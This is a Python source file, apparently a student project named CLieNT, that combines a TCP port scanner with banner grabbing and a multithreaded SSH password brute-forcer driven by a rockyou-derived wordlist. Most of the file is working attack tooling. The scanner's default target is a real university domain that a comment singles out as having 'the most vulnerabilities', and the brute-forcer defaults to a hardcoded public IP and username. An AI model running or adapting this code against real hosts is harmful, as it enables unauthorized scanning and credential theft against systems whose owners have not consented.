# All libraries used to bring this project to life
import os # Used for clear() command - Clears the console output.
import time # Used for time.sleep() command - Pauses the execution for X seconds.
import random # Used for random.randint() function.
import datetime # Used for datetime.datetime.now() function and X.strftime() method.
import socket # Used for providing access to the BSD socket interface
from IPy import IP # Used for handling IPv4 and IPv6 addresses and networks
import paramiko # Used for establishing SSH connectivity and secure connections to remote servers
import sys # Used for providing various functions and variables to manipulate different parts of the Python runtime
import termcolor # Used for ANSI color formatting for output in terminal
import threading # Used for multiple threads of execution to take place 

# This function performs a console output clear.
def FN_ClearCMD():
    clear = lambda: os.system("cls")
    clear()
    return

# This function queries the system date.
# Returns a string in the YYYYMMDD-HHMMSS format.
def FN_GetLongStructuredFileDate():
    # Get the current date
    CurrentDate = datetime.datetime.now()
    # Format the date
    LongCustomDateString = CurrentDate.strftime("%Y%m%d-%H%M%S")
    return LongCustomDateString

# This function queries the system date.
# Returns a string in the YYYY-MM-DD_HH:MM:SS.mmm format.
def FN_GetLongStructuredLogDate():
    # Get the current date
    CurrentDate = datetime.datetime.now()
    # Format the date
    LongCustomDateString = CurrentDate.strftime("%Y-%m-%d_%H:%M:%S.%f")[:-3]
    return LongCustomDateString

# Sleeps for X seconds (float number)
def FN_SleepSeconds(InputTime):
    time.sleep(InputTime)
    return

# Delays the program execution while waiting for user input (Enter key)
def FN_PressEnterToContinue():
    str(input("Press Enter to return to the main menu..."))
    return

# This function creates a Log File
def FN_LogFile():
    FileObject = None

    # Function to create and open the file
    def Create():
        nonlocal FileObject
        #FileName = "LogFile" + "-" + FN_GetLongStructuredFileDate() + ".txt"
        FileName = "CLieNT-LogFile.txt"
        FileMode = "w"  # Write only and overwrite existing file - No additional checks
        try:
            FileObject = open(FileName, FileMode, newline="")  # Then we try to open the file
            return True
        except Exception as e:
            print(f"There was an error opening the file {FileName}: {e}")
            return False

    # Function to write to the file
    def Write(DataToBeWritten):
        nonlocal FileObject
        try:
            FileObject.write("[" + FN_GetLongStructuredLogDate() + "] - " + DataToBeWritten + "\n")
            FileObject.flush()  # Flush the write cache
            return True
        except Exception as e:
            print(f"There was an error during the write operation: {e}")
            return False

    # Function to close the file
    def Close():
        nonlocal FileObject
        try:
            if FileObject is not None:
                FileObject.close()
                return True
        except Exception as e:
            print(f"There was an error closing the file: {e}")
        return False

    # Initialize the file creation
    FileCreated = Create()
    if not FileCreated:
        return False, Write, Close

    return True, Write, Close

# From here the Port Scanner Tool Begins!

# PORT SCANNER!!

# TEST ADDRESS arh.bg.ac.rs (being the one with the most vulnerabilities)

def Tool_PortScanner_SingleThreaded():
    def CheckIP(TargetIP):
        try:
            IP(TargetIP)
            return TargetIP
        except ValueError:
            return socket.gethostbyname(TargetIP)

    def ScanTarget(TargetAddress):
        ConvertedIP = CheckIP(TargetAddress)
        PortMin = 1
        PortMax = 500
        print("Scanning Target: " + str(TargetAddress))
        LogWrite("Scanning Target: " + str(TargetAddress))
        print("Port Range: " + str(PortMin) + "-" + str(PortMax))
        LogWrite("Port Range: " + str(PortMin) + "-" + str(PortMax))
        for TargetPort in range(PortMin, PortMax+1):
            ScanPort(ConvertedIP, TargetPort)

    def GetBanner(TargetSocket):
        return TargetSocket.recv(1024)

    def ScanPort(TargetIP, TargetPort):
        try:
            ActiveSocket = socket.socket()
            ActiveSocket.settimeout(0.1)
            ActiveSocket.connect((TargetIP, TargetPort))
            try:
                ActiveBanner = GetBanner(ActiveSocket)
                print("Open port is found on " + str(TargetPort) + " : " + str(ActiveBanner.decode().strip("\n")))
                LogWrite("Open port is found on " + str(TargetPort) + " : " + str(ActiveBanner.decode().strip("\n")))
            except Exception as e:
                print("Open port is found on " + str(TargetPort))
                LogWrite("Open port is found on " + str(TargetPort))
        except Exception as e:
            #print(f"Error scanning port {TargetPort}: {e}")
            #LogWrite(f"Error scanning port {TargetPort}: {e}")
            pass

    if __name__ == "__main__":
        Targets = input("Enter Target/s To Scan (If multiple targets are used, split them with comma \',\'): ")
        if "," in Targets:
            for ip_add in Targets.split(","):
                ScanTarget(ip_add.strip())
        else:
            if not Targets:
                Targets = "arh.bg.ac.rs"
                LogWrite("No target specified. Scanning the default target \"" + Targets + "\"")
            ScanTarget(Targets)
        print("Port Scanning Finished")
        LogWrite("Port Scanning Finished")
        FN_PressEnterToContinue()

# From here the SSH Brute Forcer tool begins!

# SSH BRUTE FORCER - MULTI THREADED

def Tool_SSHBruteForcer_MultiThreaded():
    stop_event = threading.Event()

    def SSH_Connect(Password):
        if not stop_event.is_set():
            SSHConnection = paramiko.SSHClient()
            SSHConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                SSHConnection.connect(TargetHost, port=22, username=TargetUsername, password=Password, timeout=30)
                stop_event.set()
                print(termcolor.colored(("Found Password: " + Password + ", For Account: " + TargetUsername), "green"))
                LogWrite("Found Password: " + Password + ", For Account: " + TargetUsername)
            except paramiko.AuthenticationException:
                if not stop_event.is_set():
                    print(termcolor.colored(("Incorrect Login: " + Password), "red"))
                    LogWrite("Incorrect Login: " + Password)
            except Exception as e:
                print(termcolor.colored(("Error: " + str(e)), "red"))
                LogWrite("Error: " + str(e))
            finally:
                SSHConnection.close()

    TargetHost = input("Target Address: ")
    if not TargetHost:
        TargetHost = "195.201.221.227"  # Default Host Address in case nothing is specified by the user(VM machine on Cloud in order to showcase the SSH Brute Forcer!)
        LogWrite("No Target Address specified. Scanning the default Target Address: \"" + TargetHost + "\"")
    TargetUsername = input("SSH Username: ")
    if not TargetUsername:
        TargetUsername = "class"  # Default Username of the cloud VM in case nothing is specified by the user!
        LogWrite("No target Username specified. Scanning the default Username: \"" + TargetUsername + "\"")
    # Passwords file enriched with the help of the rockyou.txt file from Kali Linux!
    PasswordList = "./Resources/PasswordList-v2.txt"

    if not os.path.exists(PasswordList):
        print("[!!] That File/Path Doesn\"t Exist")
        LogWrite("The Password File/Path Doesn\"t Exist")
        sys.exit(1)

    print("Threaded SSH BruteForce started on " + TargetHost + " with account name: " + TargetUsername)
    LogWrite("Threaded SSH BruteForce started on " + TargetHost + " with account name: " + TargetUsername)

    threads = []
    semaphore = threading.Semaphore(8)  # Limit to 8 threads

    try:
        with open(PasswordList, "r", encoding="utf-8") as file:
            for line in file.readlines():
                if stop_event.is_set():
                    FN_PressEnterToContinue()
                    break
                CurrentPassword = line.strip()
            
                def thread_function(password):
                    with semaphore:
                        SSH_Connect(password)
            
                t = threading.Thread(target=thread_function, args=(CurrentPassword,))
                threads.append(t)
                t.start()
                time.sleep(0.1)
    finally:
        file.close()

    # Wait for all threads to complete
    for t in threads:
        t.join()

# Here is the main execution thread!

# MAIN EXECUTION THREAD
MenuAlreadyShown = False
UserWantsToSwitch = False
UserWantsToExit = False
InputErrorOccured = False
LogFileCreated = False

# Keep running until the user wants to quit the program
while UserWantsToExit == False:
    if not LogFileCreated:
        FileCreated, LogWrite, LogClose = FN_LogFile()
        LogWrite("Program Started")
        LogFileCreated = True
    FN_ClearCMD() # Clear the console
    print("Welcome to CLieNT V1.0 developed by ADIOP Team. All Rights Reserved 2024.")
    FN_SleepSeconds(0.025)
    if (MenuAlreadyShown == False) and (InputErrorOccured == False):
        print("Please enter an option number from the following list:")
        MenuAlreadyShown = True
    FN_SleepSeconds(0.025)
    print("[1] -> Port Scanner")
    FN_SleepSeconds(0.025)
    print("[2] -> SSH Brute Forcer")
    FN_SleepSeconds(0.025)
    print("[3] -> Exit")
    FN_SleepSeconds(0.025)
    LogWrite("Main Menu Shown")
    try:
        InputErrorOccured = False
        MenuMode = int(input("Enter an option number: "))
    except:
        InputErrorOccured = True
        continue
        # Option 1
    if (MenuMode == 1):
        FN_ClearCMD()
        print("Port Scanner tool selected")
        LogWrite("Port Scanner tool selected")
        Tool_PortScanner_SingleThreaded()
        # Option 2
    elif (MenuMode == 2):
        FN_ClearCMD()
        print("SSH Brute Forcer tool selected")
        LogWrite("SSH Brute Forcer tool selected")
        Tool_SSHBruteForcer_MultiThreaded()
        # Option 3
    elif (MenuMode == 3):
        print("Exiting program...")
        LogWrite("Exiting program...")
        break
    else:
        InputErrorOccured = True
        continue
LogClose()
print("Thanks for using our software! The ADIOP Team. All Rights Reserved 2024.")